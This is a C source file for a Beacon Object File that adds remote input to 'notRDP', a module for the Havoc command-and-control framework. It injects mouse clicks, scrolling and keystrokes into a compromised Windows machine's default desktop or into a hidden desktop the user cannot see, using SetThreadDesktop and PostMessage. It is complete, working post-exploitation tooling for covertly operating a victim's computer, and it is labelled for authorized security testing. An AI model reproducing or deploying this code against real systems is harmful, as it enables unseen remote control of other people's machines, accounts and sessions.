/*
 * screeninput.c - Remote Input BOF for notRDP (Havoc C2)
 *
 * Injects mouse and keyboard events into any desktop (default or hidden).
 *
 * For hidden desktops, uses PostMessage-based injection:
 *   1. SetThreadDesktop(hHidden) — associate thread with hidden desktop
 *   2. WindowFromPoint — find the target window at click coordinates
 *   3. PostMessage WM_LBUTTONDOWN / WM_KEYDOWN etc. — deliver directly
 *   4. SetThreadDesktop(hOrig) — restore
 * No SwitchDesktop needed — the real user's desktop is never touched.
 *
 * For the default desktop, uses SendInput (standard approach).
 *
 * BOF args (packed int32 x6 + str):
 *   int32 input_type   - 0 = mouse, 1 = keyboard
 *   int32 action       - mouse: 0=move, 1=click, 2=rightclick, 3=dblclick,
 *                                4=ldown, 5=lup, 6=scroll, 7=rdown, 8=rup
 *                         kbd:  0=press, 1=down, 2=up
 *   int32 x            - mouse X (screen pixels)
 *   int32 y            - mouse Y (screen pixels)
 *   int32 keycode      - virtual key code (kbd) or scroll delta (mouse action 6)
 *   int32 flags        - bit 0: extended key flag
 *   str   desktop_name - hidden desktop name (empty = default desktop)
 *
 * Author:  Dhanush Gowda
 * License: For authorized security testing and educational use only.
 */

#include <windows.h>
#include "beacon.h"

/* ── DFR imports ── */

DECLSPEC_IMPORT int     WINAPI USER32$GetSystemMetrics(int);
DECLSPEC_IMPORT UINT    WINAPI USER32$SendInput(UINT, LPINPUT, int);
DECLSPEC_IMPORT UINT    WINAPI USER32$MapVirtualKeyA(UINT, UINT);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);

DECLSPEC_IMPORT HDESK   WINAPI USER32$OpenDesktopW(LPCWSTR, DWORD, BOOL, ACCESS_MASK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$CloseDesktop(HDESK);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetThreadDesktop(HDESK);
DECLSPEC_IMPORT HDESK   WINAPI USER32$GetThreadDesktop(DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetCurrentThreadId(void);

DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

/* PostMessage-based injection */
DECLSPEC_IMPORT BOOL    WINAPI USER32$PostMessageW(HWND, UINT, WPARAM, LPARAM);
DECLSPEC_IMPORT HWND    WINAPI USER32$WindowFromPoint(POINT);
DECLSPEC_IMPORT BOOL    WINAPI USER32$ScreenToClient(HWND, LPPOINT);
DECLSPEC_IMPORT BOOL    WINAPI USER32$SetCursorPos(int, int);
DECLSPEC_IMPORT HWND    WINAPI USER32$ChildWindowFromPointEx(HWND, POINT, UINT);
DECLSPEC_IMPORT HWND    WINAPI USER32$GetParent(HWND);
DECLSPEC_IMPORT BOOL    WINAPI USER32$IsWindowVisible(HWND);
DECLSPEC_IMPORT DWORD   WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI USER32$AttachThreadInput(DWORD, DWORD, BOOL);
DECLSPEC_IMPORT HWND    WINAPI USER32$SetFocus(HWND);


/* ── DPI awareness ── */

typedef void* DPI_CTX;
typedef DPI_CTX (WINAPI *PFN_SetThreadDpiCtx)(DPI_CTX);

static PFN_SetThreadDpiCtx pSetDpi = NULL;
static DPI_CTX oldDpi = NULL;

static void dpi_enter(void) {
    HMODULE hU32 = KERNEL32$GetModuleHandleA("user32.dll");
    if (!hU32) return;
    pSetDpi = (PFN_SetThreadDpiCtx)KERNEL32$GetProcAddress(hU32,
        "SetThreadDpiAwarenessContext");
    if (pSetDpi)
        oldDpi = pSetDpi((DPI_CTX)(LONG_PTR)(-4));
}

static void dpi_leave(void) {
    if (pSetDpi && oldDpi)
        pSetDpi(oldDpi);
    pSetDpi = NULL;
    oldDpi = NULL;
}


/* ── Helpers ── */

static wchar_t *to_wide(const char *s) {
    int len = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (len <= 0) return NULL;
    wchar_t *w = (wchar_t *)KERNEL32$VirtualAlloc(NULL, len * sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!w) return NULL;
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}

static void zero_mem(void *p, int n) {
    char *c = (char *)p;
    int i;
    for (i = 0; i < n; i++) c[i] = 0;
}


/* CWP flags for ChildWindowFromPointEx */
#ifndef CWP_SKIPINVISIBLE
#define CWP_SKIPINVISIBLE 0x0001
#endif
#ifndef CWP_SKIPDISABLED
#define CWP_SKIPDISABLED 0x0002
#endif
#ifndef CWP_SKIPTRANSPARENT
#define CWP_SKIPTRANSPARENT 0x0004
#endif


/*
 * Find the deepest visible child window at screen point (x, y).
 * Returns the innermost window handle, or NULL.
 */
static HWND find_target_window(int x, int y) {
    POINT pt;
    pt.x = x;
    pt.y = y;
    HWND hwnd = USER32$WindowFromPoint(pt);
    if (!hwnd) return NULL;

    /* Walk into child windows for more precise targeting */
    POINT cpt;
    cpt.x = x;
    cpt.y = y;
    USER32$ScreenToClient(hwnd, &cpt);
    HWND child = USER32$ChildWindowFromPointEx(hwnd, cpt,
        CWP_SKIPINVISIBLE | CWP_SKIPDISABLED | CWP_SKIPTRANSPARENT);
    if (child && child != hwnd) {
        return child;
    }
    return hwnd;
}


/* ── PostMessage-based mouse injection (for hidden desktops) ── */

static void do_mouse_msg(int action, int x, int y, int keycode) {
    HWND hwnd = find_target_window(x, y);
    if (!hwnd) return;

    /* Convert screen coords to client coords for this window */
    POINT cpt;
    cpt.x = x;
    cpt.y = y;
    USER32$ScreenToClient(hwnd, &cpt);
    LPARAM lParam = MAKELPARAM((short)cpt.x, (short)cpt.y);

    /* Also move the cursor so GetCursorPos-based apps see it */
    USER32$SetCursorPos(x, y);

    /* Activate the window on click so it receives keyboard focus */
    if (action >= 1 && action <= 5 && action != 0) {
        /* Attach input to the target thread so SetFocus works cross-thread */
        DWORD targetTid = USER32$GetWindowThreadProcessId(hwnd, NULL);
        DWORD myTid = KERNEL32$GetCurrentThreadId();
        if (targetTid && targetTid != myTid) {
            USER32$AttachThreadInput(myTid, targetTid, TRUE);
            USER32$SetFocus(hwnd);
            USER32$AttachThreadInput(myTid, targetTid, FALSE);
        }
    }

    switch (action) {
        case 0: /* move */
            USER32$PostMessageW(hwnd, WM_MOUSEMOVE, 0, lParam);
            break;
        case 1: /* left click (down+up) */
            USER32$PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
            USER32$PostMessageW(hwnd, WM_LBUTTONUP, 0, lParam);
            break;
        case 2: /* right click (down+up) */
            USER32$PostMessageW(hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);
            USER32$PostMessageW(hwnd, WM_RBUTTONUP, 0, lParam);
            break;
        case 3: /* double click */
            USER32$PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
            USER32$PostMessageW(hwnd, WM_LBUTTONUP, 0, lParam);
            USER32$PostMessageW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lParam);
            USER32$PostMessageW(hwnd, WM_LBUTTONUP, 0, lParam);
            break;
        case 4: /* left down (drag start) */
            USER32$PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lParam);
            break;
        case 5: /* left up (drag end) */
            USER32$PostMessageW(hwnd, WM_LBUTTONUP, 0, lParam);
            break;
        case 6: /* scroll — WM_MOUSEWHEEL uses screen coords in lParam */
            USER32$PostMessageW(hwnd, 0x020A, /* WM_MOUSEWHEEL */
                MAKEWPARAM(0, (short)keycode),
                MAKELPARAM((short)x, (short)y));
            break;
        case 7: /* right down */
            USER32$PostMessageW(hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lParam);
            break;
        case 8: /* right up */
            USER32$PostMessageW(hwnd, WM_RBUTTONUP, 0, lParam);
            break;
    }
}


/* ── PostMessage-based keyboard injection (for hidden desktops) ── */

static void do_kbd_msg(int action, int keycode, int flags, int x, int y) {
    /* Send keyboard events to the window under the last mouse position */
    HWND hwnd = find_target_window(x, y);
    if (!hwnd) return;

    WORD scan = (WORD)USER32$MapVirtualKeyA((UINT)keycode, 0);
    int extended = flags & 1;

    /* Build lParam per WM_KEYDOWN/WM_KEYUP specification:
       bits  0-15: repeat count (1)
       bits 16-23: scan code
       bit  24:    extended key flag
       bit  30:    previous key state (1 for keyup)
       bit  31:    transition state (1 for keyup) */
    LPARAM lDown = 1
                 | ((DWORD)scan << 16)
                 | (extended ? (1 << 24) : 0);
    LPARAM lUp   = 1
                 | ((DWORD)scan << 16)
                 | (extended ? (1 << 24) : 0)
                 | (1 << 30)
                 | ((DWORD)1 << 31);

    switch (action) {
        case 1: /* key down */
            USER32$PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)keycode, lDown);
            break;
        case 2: /* key up */
            USER32$PostMessageW(hwnd, WM_KEYUP, (WPARAM)keycode, lUp);
            break;
        default: /* 0 = press (down then up) */
            USER32$PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)keycode, lDown);
            USER32$PostMessageW(hwnd, WM_KEYUP, (WPARAM)keycode, lUp);
            break;
    }
}


/* ── SendInput-based injection (for default desktop) ── */

static void do_mouse_si(int action, int x, int y, int keycode, int sw, int sh) {
    INPUT inp;
    zero_mem(&inp, sizeof(inp));
    inp.type = INPUT_MOUSE;
    inp.mi.dx = (LONG)(((LONGLONG)x * 65535) / (sw > 1 ? sw - 1 : 1));
    inp.mi.dy = (LONG)(((LONGLONG)y * 65535) / (sh > 1 ? sh - 1 : 1));
    inp.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;

    switch (action) {
        case 0:
            break;
        case 1:
            inp.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
            break;
        case 2:
            inp.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP;
            break;
        case 3:
            inp.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
            USER32$SendInput(1, &inp, sizeof(INPUT));
            zero_mem(&inp, sizeof(inp));
            inp.type = INPUT_MOUSE;
            inp.mi.dx = (LONG)(((LONGLONG)x * 65535) / (sw > 1 ? sw - 1 : 1));
            inp.mi.dy = (LONG)(((LONGLONG)y * 65535) / (sh > 1 ? sh - 1 : 1));
            inp.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE
                           | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP;
            break;
        case 4:
            inp.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
            break;
        case 5:
            inp.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
            break;
        case 6:
            inp.mi.dwFlags |= MOUSEEVENTF_WHEEL;
            inp.mi.mouseData = (DWORD)keycode;
            break;
        case 7:
            inp.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
            break;
        case 8:
            inp.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
            break;
    }
    USER32$SendInput(1, &inp, sizeof(INPUT));
}

static void do_kbd_si(int action, int keycode, int flags) {
    INPUT inp;
    zero_mem(&inp, sizeof(inp));
    inp.type = INPUT_KEYBOARD;
    inp.ki.wVk = (WORD)keycode;
    inp.ki.wScan = (WORD)USER32$MapVirtualKeyA((UINT)keycode, 0);

    switch (action) {
        case 1:
            inp.ki.dwFlags = (flags & 1) ? KEYEVENTF_EXTENDEDKEY : 0;
            USER32$SendInput(1, &inp, sizeof(INPUT));
            break;
        case 2:
            inp.ki.dwFlags = KEYEVENTF_KEYUP
                           | ((flags & 1) ? KEYEVENTF_EXTENDEDKEY : 0);
            USER32$SendInput(1, &inp, sizeof(INPUT));
            break;
        default:
            inp.ki.dwFlags = (flags & 1) ? KEYEVENTF_EXTENDEDKEY : 0;
            USER32$SendInput(1, &inp, sizeof(INPUT));
            inp.ki.dwFlags = KEYEVENTF_KEYUP
                           | ((flags & 1) ? KEYEVENTF_EXTENDEDKEY : 0);
            USER32$SendInput(1, &inp, sizeof(INPUT));
            break;
    }
}


/* ── Entry point ── */

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int input_type = BeaconDataInt(&parser);
    int action     = BeaconDataInt(&parser);
    int x          = BeaconDataInt(&parser);
    int y          = BeaconDataInt(&parser);
    int keycode    = BeaconDataInt(&parser);
    int flags      = BeaconDataInt(&parser);

    char *desktop_name = NULL;
    int name_len = 0;
    if (BeaconDataLength(&parser) > 0)
        desktop_name = BeaconDataExtract(&parser, &name_len);

    int use_hidden = (desktop_name && desktop_name[0]);

    HDESK hHiddenDesk = NULL;
    HDESK hOrigDesk   = NULL;

    if (use_hidden) {
        wchar_t *wName = to_wide(desktop_name);
        if (wName) {
            hHiddenDesk = USER32$OpenDesktopW(wName, 0, FALSE, GENERIC_ALL);
            KERNEL32$VirtualFree(wName, 0, MEM_RELEASE);
        }
        if (!hHiddenDesk) {
            BeaconPrintf(CALLBACK_ERROR,
                "[screeninput] OpenDesktopW('%s') failed", desktop_name);
            return;
        }
    }

    dpi_enter();

    if (use_hidden) {
        /*
         * PostMessage path — no SwitchDesktop, no flicker.
         * Associate our thread with the hidden desktop so
         * WindowFromPoint / PostMessage target its windows.
         */
        hOrigDesk = USER32$GetThreadDesktop(KERNEL32$GetCurrentThreadId());
        if (!USER32$SetThreadDesktop(hHiddenDesk)) {
            BeaconPrintf(CALLBACK_ERROR,
                "[screeninput] SetThreadDesktop failed");
            /* fall through — try anyway */
        }

        if (input_type == 0) {
            do_mouse_msg(action, x, y, keycode);
        } else if (input_type == 1) {
            do_kbd_msg(action, keycode, flags, x, y);
        }

        /* Restore thread desktop */
        if (hOrigDesk)
            USER32$SetThreadDesktop(hOrigDesk);
    } else {
        /*
         * SendInput path — standard injection on default desktop.
         */
        int sw = USER32$GetSystemMetrics(SM_CXSCREEN);
        int sh = USER32$GetSystemMetrics(SM_CYSCREEN);
        if (sw <= 0 || sh <= 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[screeninput] GetSystemMetrics: %dx%d", sw, sh);
            goto cleanup;
        }

        if (input_type == 0) {
            do_mouse_si(action, x, y, keycode, sw, sh);
        } else if (input_type == 1) {
            do_kbd_si(action, keycode, flags);
        }
    }

cleanup:
    dpi_leave();
    if (hHiddenDesk)
        USER32$CloseDesktop(hHiddenDesk);
}
